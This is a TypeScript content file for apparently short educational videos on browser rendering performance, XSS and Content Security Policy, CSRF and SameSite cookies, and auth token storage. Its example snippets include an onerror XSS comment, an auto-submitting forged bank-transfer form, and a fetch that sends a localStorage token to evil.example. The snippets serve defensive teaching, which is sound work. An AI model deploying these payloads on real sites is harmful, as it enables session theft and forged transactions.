import type { Series } from '../types';

const toastAnim = `// slide a toast in from above
toast.animate([
  { top: '-80px' },
  { top: '0px' },
], 300);

toast.animate([
  { transform: 'translateY(-80px)' },
  { transform: 'none' },
], 300);`;

const pipeline = (active: number) => ({
  type: 'timeline' as const,
  title: 'One frame, four steps',
  steps: [
    { label: 'Style', sub: 'which CSS applies', icon: '🎨' },
    { label: 'Layout', sub: 'sizes and positions', icon: '📐' },
    { label: 'Paint', sub: 'fill in pixels', icon: '🖌️' },
    { label: 'Composite', sub: 'stack layers on GPU', icon: '🧱' },
  ],
  active,
});

const threads = (busy: boolean) => ({
  type: 'diagram' as const,
  title: 'Who moves the toast?',
  cols: 1,
  rows: 4,
  nodes: [
    {
      id: 'main',
      label: 'Main',
      sub: busy ? 'busy with JS' : 'JS, layout',
      icon: busy ? '🔥' : '🧠',
      x: 0,
      y: 0,
      tone: busy ? ('bad' as const) : ('info' as const),
    },
    { id: 'comp', label: 'Compositor', sub: 'own thread', icon: '🧱', x: 0, y: 1.5, active: true },
    { id: 'gpu', label: 'GPU', sub: 'draws layers', icon: '🖥️', x: 0, y: 3, tone: 'good' as const },
  ],
  edges: [
    { from: 'main', to: 'comp', label: 'layers', dashed: busy },
    { from: 'comp', to: 'gpu', active: true },
  ],
  packets: [{ from: 'comp', to: 'gpu', label: 'move', tone: 'good' as const }],
  caption: busy ? 'the toast keeps gliding' : 'no layout, no paint',
});

const renderComment = `// show the newest comment
const c = await getComment();

list.innerHTML +=
  \`<li>\${c.text}</li>\`;`;

const eveComment = `Great post!
<img src="x"
  onerror="steal()">`;

const nonceHtml = `<!-- CSP: script-src 'nonce-k3J9' -->
<script nonce="k3J9">
  initAnalytics();
</script>`;

const catForm = `<!-- on cute-cats.example -->
<form method="POST"
  action="https://bank.example/pay">
  <input name="to" value="eve">
  <input name="amount" value="500">
</form>
<script>
  document.forms[0].submit();
</script>`;

const sameSite = (active: number) => ({
  type: 'list' as const,
  title: 'The SameSite flag',
  items: [
    { text: 'Strict', icon: '🔒', sub: 'never sent cross-site' },
    { text: 'Lax', icon: '🔗', sub: 'only on top-level links' },
    { text: 'None', icon: '🌐', sub: 'always sent, needs Secure' },
  ],
  active,
});

const sessionCookie = `Set-Cookie: session=a1b2;
  HttpOnly; Secure;
  SameSite=Lax; Path=/`;

const authSetup = `// after login
localStorage.setItem(
  'token', res.accessToken);

// every API call
fetch('/api/me', { headers: {
  Authorization: \`Bearer \${token}\`,
}});`;

const injected = `// injected via an XSS bug
fetch('https://evil.example', {
  method: 'POST',
  body: localStorage.getItem(
    'token'),
});`;

const refreshFlow = (active: number) => ({
  type: 'timeline' as const,
  title: 'Access + refresh',
  steps: [
    { label: 'Log in', icon: '🔐' },
    { label: 'Access token', sub: 'in memory, minutes', icon: '🎟️' },
    { label: 'Expires', icon: '⏰' },
    { label: 'Refresh', sub: 'cookie rides along', icon: '🔄' },
    { label: 'New pair', icon: '✨' },
  ],
  active,
});

export const series: Series = {
  id: 'eng-browser-security',
  title: 'Browser & security',
  emoji: '🛡️',
  color: '#f87171',
  order: 6,
  blurb: 'How the browser draws a frame, and how attackers abuse it.',
  reels: [
    {
      id: 'sec-render-pipeline',
      title: 'Why transform beats top',
      beats: [
        {
          say: 'Animate top, and the browser redoes layout on every single frame.',
          scene: {
            type: 'title',
            kicker: 'Browser rendering',
            title: 'Animating *top* is slow',
            emoji: '🐢',
            style: 'slam',
          },
          sfx: 'whoosh',
          emphasis: ['top', 'layout'],
        },
        {
          say: 'Same toast, two animations. The one that moves top stutters on a slow phone.',
          scene: {
            type: 'code',
            lang: 'js',
            file: 'toast.js',
            code: toastAnim,
            errors: [[2, 5]],
            note: { line: 5, text: 'stutters on slow phones 🐢', tone: 'bad' },
          },
          sfx: 'type',
          emphasis: ['top', 'stutters'],
        },
        {
          say: 'The one that moves transform stays smooth, even when the page is busy.',
          scene: {
            type: 'code',
            lang: 'js',
            file: 'toast.js',
            code: toastAnim,
            added: [[7, 10]],
            note: { line: 10, text: 'smooth, even when busy 🧈', tone: 'good' },
          },
          emphasis: ['transform', 'smooth'],
        },
        {
          say: 'Why? Each frame, the browser can run four steps: style, layout, paint, then composite.',
          scene: pipeline(0),
          sfx: 'swipe',
          emphasis: ['four', 'steps'],
        },
        {
          say: 'Layout works out the size and position of every box. Move one, and its neighbours may move too.',
          scene: pipeline(1),
          emphasis: ['Layout', 'neighbours'],
        },
        {
          say: 'At sixty frames a second, you get 16 milliseconds per frame. Animating top reruns layout and paint each time.',
          scene: {
            type: 'stat',
            value: '16.6',
            unit: 'ms',
            label: 'per frame at *60fps*',
            sub: 'top reruns layout and paint',
            tone: 'warn',
          },
          sfx: 'ding',
          emphasis: ['16', 'layout'],
        },
        {
          say: 'Transform skips layout and paint. A separate compositor thread just slides the already painted layer.',
          scene: threads(false),
          sfx: 'swipe',
          emphasis: ['skips', 'compositor'],
        },
        {
          say: 'So even when JavaScript blocks the main thread, a transform animation keeps gliding.',
          scene: threads(true),
          emphasis: ['blocks', 'gliding'],
        },
        {
          say: 'Opacity works the same way. Those two are the cheap ones. Width, top and left are not.',
          scene: {
            type: 'compare',
            title: 'Cost per frame',
            left: { title: 'top, left, width', verdict: 'bad', items: ['Layout every frame', 'Paint every frame', 'Main thread only'] },
            right: { title: 'transform', verdict: 'ok', items: ['Composite only', 'Off the main thread', 'Opacity too'] },
          },
          sfx: 'swipe',
          emphasis: ['Opacity', 'cheap'],
        },
        {
          say: 'Remember this. Layout is the expensive step. Animate transform and opacity, and the browser just moves layers.',
          scene: {
            type: 'outro',
            points: ['Style, layout, paint, *composite*', '*top* reruns layout every frame', 'transform and opacity skip ahead'],
            tagline: 'Move layers, not boxes.',
          },
          sfx: 'success',
          emphasis: ['transform', 'opacity'],
        },
      ],
    },
    {
      id: 'sec-xss-csp',
      title: 'XSS and Content Security Policy',
      beats: [
        {
          say: "This blog comment looks harmless. It runs JavaScript in every reader's browser.",
          scene: {
            type: 'title',
            kicker: 'Web security',
            title: 'This comment *runs code*',
            emoji: '💉',
            style: 'glitch',
          },
          sfx: 'whoosh',
          emphasis: ['harmless', 'JavaScript'],
        },
        {
          say: "Here's the bug. The page drops a user's comment straight into innerHTML, as raw HTML.",
          speak: "Here's the bug. The page drops a user's comment straight into inner H T M L, as raw H T M L.",
          scene: {
            type: 'code',
            lang: 'js',
            file: 'comments.js',
            code: renderComment,
            errors: [[4, 5]],
            note: { line: 5, text: 'trusts user text 😬', tone: 'bad' },
          },
          sfx: 'type',
          emphasis: ['innerHTML', 'raw'],
        },
        {
          say: "Eve's comment hides an image with a broken source. Its onerror handler fires, and that's her code.",
          speak: "Eve's comment hides an image with a broken source. Its on error handler fires, and that's her code.",
          scene: {
            type: 'code',
            lang: 'xml',
            file: 'eve-comment.html',
            code: eveComment,
            highlight: [3],
            note: { line: 3, text: 'fires when the image fails', tone: 'bad' },
          },
          sfx: 'error',
          emphasis: ['broken', 'onerror'],
        },
        {
          say: 'This is cross-site scripting, or XSS. Her script runs as your site, so it can read tokens and call your API.',
          speak: 'This is cross-site scripting, or X S S. Her script runs as your site, so it can read tokens and call your A P I.',
          scene: {
            type: 'phone',
            os: 'ios',
            screen: {
              kind: 'app',
              title: 'My Blog',
              icon: '📝',
              body: 'Comments (3)',
              items: [
                { id: 'c1', label: 'Great post!', sub: 'Eve', icon: '🙂', tone: 'bad' },
                { id: 'c2', label: 'Thanks for this', sub: 'Sam', icon: '👍' },
                { id: 'c3', label: 'Bookmarked', sub: 'Lee', icon: '🔖' },
                { id: 'c4', label: 'Love this layout', sub: 'Kim', icon: '❤️' },
              ],
              button: 'Post',
              toast: 'token sent to evil.example',
            },
            caption: 'runs as your site 😱',
          },
          sfx: 'swipe',
          emphasis: ['XSS', 'tokens'],
        },
        {
          say: 'Fix one is escaping. Use textContent, or let React render the text, so tags show up as plain characters.',
          speak: 'Fix one is escaping. Use text content, or let React render the text, so tags show up as plain characters.',
          scene: {
            type: 'compare',
            title: 'Escape the text',
            left: { title: 'innerHTML', verdict: 'bad', items: ['Parses tags', 'Runs handlers'] },
            right: { title: 'textContent', verdict: 'ok', items: ['Tags shown as text', 'Nothing runs'] },
          },
          sfx: 'swipe',
          emphasis: ['escaping', 'textContent'],
        },
        {
          say: 'Fix two is a safety net, Content Security Policy. A response header tells the browser which scripts may run.',
          scene: {
            type: 'terminal',
            title: 'Response header',
            lines: [
              { cmd: 'curl -I blog.example' },
              { out: 'HTTP/2 200' },
              { out: 'content-security-policy:' },
              { out: "  script-src 'self'", tone: 'good' },
            ],
          },
          sfx: 'type',
          emphasis: ['Content', 'Security', 'Policy'],
        },
        {
          say: "With script-src self, only files from your own origin run. Inline handlers and outside scripts get blocked.",
          speak: 'With script source self, only files from your own origin run. Inline handlers and outside scripts get blocked.',
          scene: {
            type: 'diagram',
            title: 'The browser checks',
            cols: 3,
            rows: 3,
            nodes: [
              { id: 'csp', label: 'Browser', sub: "script-src 'self'", icon: '🛡️', x: 1, y: 0, active: true },
              { id: 'app', label: 'app.js', sub: 'same origin', icon: '✅', x: 0, y: 2, tone: 'good' },
              { id: 'inline', label: 'onerror', sub: 'inline', icon: '⛔', x: 1, y: 2, tone: 'bad' },
              { id: 'evil', label: 'evil.js', sub: 'other site', icon: '⛔', x: 2, y: 2, tone: 'bad' },
            ],
            edges: [
              { from: 'csp', to: 'app', tone: 'good', active: true },
              { from: 'csp', to: 'inline', tone: 'bad', dashed: true },
              { from: 'csp', to: 'evil', tone: 'bad', dashed: true },
            ],
            caption: "Eve's onerror never runs",
          },
          sfx: 'swipe',
          emphasis: ['origin', 'blocked'],
        },
        {
          say: "Need an inline script? Give it a nonce, a fresh random value on every response. Injected code can't guess it.",
          speak: "Need an inline script? Give it a nonce, a fresh random value on every response. Injected code can't guess it.",
          scene: {
            type: 'code',
            lang: 'xml',
            file: 'index.html',
            code: nonceHtml,
            highlight: [2],
            note: { line: 2, text: 'new random value per response', tone: 'accent' },
          },
          sfx: 'type',
          emphasis: ['nonce', 'random'],
        },
        {
          say: 'Remember this. Escaping stops the injection. CSP stops injected script from running when escaping misses one.',
          speak: 'Remember this. Escaping stops the injection. C S P stops injected script from running when escaping misses one.',
          scene: {
            type: 'outro',
            points: ['Never put user text in *innerHTML*', 'Escape by default', '*CSP* blocks what slips through'],
            tagline: 'Escape first. CSP second.',
          },
          sfx: 'success',
          emphasis: ['Escaping', 'CSP'],
        },
      ],
    },
    {
      id: 'sec-csrf-samesite',
      title: 'CSRF and SameSite cookies',
      beats: [
        {
          say: 'You never pressed transfer. Your bank sent the money anyway.',
          scene: {
            type: 'title',
            kicker: 'Web security',
            title: 'You *never* clicked transfer',
            emoji: '🏦',
            style: 'slam',
          },
          sfx: 'whoosh',
          emphasis: ['never', 'anyway'],
        },
        {
          say: "You're logged into your bank, and you open a cat site. It hides a form that posts to the bank.",
          scene: {
            type: 'code',
            lang: 'xml',
            file: 'cats.html',
            code: catForm,
            highlight: [[2, 6]],
          },
          sfx: 'type',
          emphasis: ['hides', 'bank'],
        },
        {
          say: 'One line of script submits it the moment the page loads. All you see is cats.',
          scene: {
            type: 'code',
            lang: 'xml',
            file: 'cats.html',
            code: catForm,
            errors: [8],
            note: { line: 8, text: 'submits itself on load', tone: 'bad' },
          },
          sfx: 'error',
          emphasis: ['submits', 'cats'],
        },
        {
          say: 'Without SameSite, the browser attaches your bank cookie. Cookies follow where a request goes, not where it came from.',
          scene: {
            type: 'diagram',
            title: 'The forged request',
            cols: 3,
            rows: 3,
            nodes: [
              { id: 'cats', label: 'Cat site', sub: 'other site', icon: '🐱', x: 0, y: 0, tone: 'bad' },
              { id: 'browser', label: 'Browser', sub: 'has bank cookie', icon: '🍪', x: 2, y: 0 },
              { id: 'bank', label: 'Bank', sub: 'checks cookie', icon: '🏦', x: 1, y: 2, active: true },
            ],
            edges: [
              { from: 'cats', to: 'browser', label: 'POST', tone: 'bad' },
              { from: 'browser', to: 'bank', active: true },
            ],
            packets: [{ from: 'browser', to: 'bank', label: '🍪', tone: 'warn' }],
            caption: 'the cookie rides along',
          },
          sfx: 'swipe',
          emphasis: ['cookie', 'goes'],
        },
        {
          say: "The bank sees a valid session, so it thinks you asked. That's cross-site request forgery, or CSRF.",
          speak: "The bank sees a valid session, so it thinks you asked. That's cross-site request forgery, or C S R F.",
          scene: {
            type: 'phone',
            os: 'ios',
            screen: {
              kind: 'app',
              title: 'Bank',
              icon: '🏦',
              body: 'Recent activity',
              items: [
                { id: 'p1', label: 'Paid eve', icon: '💸', value: '500', tone: 'bad' },
                { id: 'p2', label: 'Coffee', icon: '☕', value: '4' },
                { id: 'p3', label: 'Groceries', icon: '🛒', value: '62' },
                { id: 'p4', label: 'Salary', icon: '💼', value: '+3200', tone: 'good' },
              ],
              button: 'New transfer',
              toast: 'Transfer complete',
            },
            caption: 'you never asked for this',
          },
          sfx: 'swipe',
          emphasis: ['valid', 'forgery'],
        },
        {
          say: 'The fix is the SameSite cookie flag. Strict never sends the cookie on a request started by another site.',
          scene: sameSite(0),
          sfx: 'swipe',
          emphasis: ['SameSite', 'Strict'],
        },
        {
          say: 'Lax sends it when you click a link to the bank, but not on a cross-site POST. The forged form fails.',
          scene: sameSite(1),
          emphasis: ['Lax', 'fails'],
        },
        {
          say: "Careful. Chrome treats a cookie with no SameSite as Lax. Firefox and Safari don't, so set it yourself.",
          scene: {
            type: 'compare',
            title: 'No SameSite set?',
            left: { title: 'Chrome, Edge', verdict: 'ok', items: ['Treated as Lax', 'Forged POST blocked'] },
            right: { title: 'Firefox, Safari', verdict: 'bad', items: ['Not Lax by default', 'Set it yourself'] },
          },
          sfx: 'swipe',
          emphasis: ['Chrome', 'yourself'],
        },
        {
          say: 'Set SameSite on every session cookie, keep GET requests read-only, and check the Origin header on writes.',
          scene: {
            type: 'code',
            lang: 'text',
            file: 'response headers',
            code: sessionCookie,
            added: [3],
            note: { line: 3, text: 'always say it out loud', tone: 'good' },
          },
          sfx: 'type',
          emphasis: ['GET', 'Origin'],
        },
        {
          say: 'Remember this. Your cookie goes wherever the request goes. SameSite decides whether it may.',
          scene: {
            type: 'outro',
            points: ['Cookies follow the *destination*', '*SameSite* blocks forged POSTs', 'Never change data on GET'],
            tagline: "Set it. Don't assume it.",
          },
          sfx: 'success',
          emphasis: ['wherever', 'SameSite'],
        },
      ],
    },
    {
      id: 'sec-token-storage',
      title: 'Where to keep auth tokens',
      beats: [
        {
          say: 'One script bug, and your token in localStorage walks out the door.',
          speak: 'One script bug, and your token in local storage walks out the door.',
          scene: {
            type: 'title',
            kicker: 'Auth tokens',
            title: 'Where do *tokens* live?',
            emoji: '🔑',
            style: 'slam',
          },
          sfx: 'whoosh',
          emphasis: ['token', 'door'],
        },
        {
          say: 'The common setup. Save the access token in localStorage, then attach it to every API call.',
          speak: 'The common setup. Save the access token in local storage, then attach it to every A P I call.',
          scene: {
            type: 'code',
            lang: 'js',
            file: 'auth.js',
            code: authSetup,
            highlight: [[2, 3]],
            note: { line: 3, text: 'easy, and very common', tone: 'accent' },
          },
          sfx: 'type',
          emphasis: ['localStorage', 'every'],
        },
        {
          say: 'But any script on the page can read localStorage, including one injected through cross-site scripting.',
          speak: 'But any script on the page can read local storage, including one injected through cross-site scripting.',
          scene: {
            type: 'code',
            lang: 'js',
            file: 'injected.js',
            code: injected,
            errors: [[4, 5]],
            note: { line: 5, text: 'any script can read it', tone: 'bad' },
          },
          sfx: 'error',
          emphasis: ['any', 'injected'],
        },
        {
          say: "Now the token sits on the attacker's laptop. They call your API as you, until it expires.",
          speak: "Now the token sits on the attacker's laptop. They call your A P I as you, until it expires.",
          scene: {
            type: 'diagram',
            title: 'The token walks out',
            cols: 3,
            rows: 3,
            nodes: [
              { id: 'page', label: 'Your page', sub: 'XSS bug', icon: '🐛', x: 0, y: 0, tone: 'bad' },
              { id: 'eve', label: 'Attacker', sub: 'own laptop', icon: '🕵️', x: 2, y: 0 },
              { id: 'api', label: 'Your API', sub: 'sees valid token', icon: '🖥️', x: 1, y: 2, active: true },
            ],
            edges: [
              { from: 'page', to: 'eve', label: 'token', tone: 'bad' },
              { from: 'eve', to: 'api', active: true },
            ],
            packets: [{ from: 'eve', to: 'api', label: '🎟️', tone: 'warn' }],
            caption: 'works for days, from anywhere',
          },
          sfx: 'swipe',
          emphasis: ['laptop', 'expires'],
        },
        {
          say: "An httpOnly cookie hides the token from JavaScript. The browser still sends it, but scripts can't read it.",
          speak: "An H T T P only cookie hides the token from JavaScript. The browser still sends it, but scripts can't read it.",
          scene: {
            type: 'code',
            lang: 'text',
            file: 'response headers',
            code: sessionCookie,
            highlight: [2],
            note: { line: 2, text: 'JavaScript cannot read it', tone: 'good' },
          },
          sfx: 'type',
          emphasis: ['httpOnly', 'hides'],
        },
        {
          say: "It's not magic. XSS can still call your API while the tab is open, and auto-sent cookies need SameSite.",
          speak: "It's not magic. X S S can still call your A P I while the tab is open, and auto-sent cookies need same site.",
          scene: {
            type: 'compare',
            title: 'Token storage',
            left: { title: 'localStorage', verdict: 'bad', items: ['Any script reads it', 'Stolen token travels'] },
            right: { title: 'httpOnly cookie', verdict: 'ok', items: ['Hidden from scripts', 'Sent automatically', 'Needs SameSite'] },
          },
          sfx: 'swipe',
          emphasis: ['magic', 'SameSite'],
        },
        {
          say: 'A common pattern: a short-lived access token in memory, and a long-lived refresh token in an httpOnly cookie.',
          speak: 'A common pattern: a short-lived access token in memory, and a long-lived refresh token in an H T T P only cookie.',
          scene: refreshFlow(1),
          sfx: 'swipe',
          emphasis: ['memory', 'refresh'],
        },
        {
          say: 'When the access token expires, call the refresh endpoint. The cookie rides along, and you get a fresh pair.',
          scene: refreshFlow(3),
          emphasis: ['expires', 'fresh'],
        },
        {
          say: 'Rotate the refresh token on every use. If an old one shows up again, revoke the whole session.',
          scene: {
            type: 'list',
            title: 'Refresh token rules',
            items: [
              { text: 'Rotate on *every* use', icon: '🔄', sub: 'each refresh, a new one' },
              { text: 'Old one reused?', icon: '🚨', sub: 'revoke the session' },
              { text: 'Scope the cookie', icon: '📍', sub: 'path: /auth only' },
            ],
            active: 1,
          },
          sfx: 'ding',
          emphasis: ['Rotate', 'revoke'],
        },
        {
          say: "Remember this. Keep tokens out of JavaScript's reach, keep access tokens short, and rotate refresh tokens.",
          scene: {
            type: 'outro',
            points: ['Any script can read *localStorage*', '*httpOnly* hides tokens from JS', 'Short access, rotated refresh'],
            tagline: 'Hide. Shorten. Rotate.',
          },
          sfx: 'success',
          emphasis: ['reach', 'rotate'],
        },
      ],
    },
  ],
};
